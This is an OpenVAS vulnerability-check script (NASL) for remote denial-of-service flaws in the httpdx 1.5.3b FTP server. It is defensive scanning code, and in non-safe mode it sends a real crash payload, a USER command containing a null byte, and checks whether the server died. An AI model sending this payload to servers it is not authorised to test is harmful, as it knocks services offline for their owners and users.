###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_httpdx_38718.nasl 8207 2017-12-21 07:30:12Z teissa $
#
# httpdx Multiple Remote Denial Of Service Vulnerabilities
#
# Authors:
# Michael Meyer
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "httpdx is prone to multiple remote denial-of-service vulnerabilities.

Successful exploits may allow an attacker to crash the affected
application, resulting in a denial-of-service condition.

httpdx 1.5.3b is vulnerable; other versions may also be affected.";


if (description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.100534");
 script_version("$Revision: 8207 $");
 script_tag(name:"last_modification", value:"$Date: 2017-12-21 08:30:12 +0100 (Thu, 21 Dec 2017) $");
 script_tag(name:"creation_date", value:"2010-03-15 19:33:39 +0100 (Mon, 15 Mar 2010)");
 script_bugtraq_id(38718);
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");

 script_name("httpdx Multiple Remote Denial Of Service Vulnerabilities");

 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/38718");
 script_xref(name : "URL" , value : "http://sourceforge.net/projects/httpdx/");

 script_tag(name:"qod_type", value:"remote_vul");
 script_category(ACT_MIXED_ATTACK);
 script_family("FTP");
 script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl","secpod_ftp_anonymous.nasl","ftpserver_detect_type_nd_version.nasl");
 script_require_ports("Services/ftp", 21);
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include("ftp_func.inc");

ftpPort = get_kb_item("Services/ftp");
if(!ftpPort){
  ftpPort = 21;
}

if(get_kb_item('ftp/'+ftpPort+'/broken'))exit(0);

if(!get_port_state(ftpPort)){
  exit(0);
}

banner = get_ftp_banner(port: ftpPort);
if("httpdx" >!< banner)exit(0);

if(safe_checks()) {

  include("version_func.inc");

  version = eregmatch(pattern: "httpdx/([^ ]+)", string: banner);
  if(isnull(version[1]))exit(0);

  if(version_is_equal(version: version[1], test_version: "1.5.3b")) {
    security_message(port: ftpPort);
    exit(0);
  }  

} else {  

  soc = open_sock_tcp(ftpPort);
  if(!soc){
    exit(0);
  } 

  ftp_recv_line(socket:soc);

  data = string("USER ",raw_string(0x00),"0\r\n");
  send(socket:soc, data: data);
  close(soc);

  soc1 = open_sock_tcp(ftpPort);
 
  if(!ftp_recv_line(socket:soc1)) {
  
    security_message(port: ftpPort);
    exit(0);

  }  

}  


exit(0); 

     
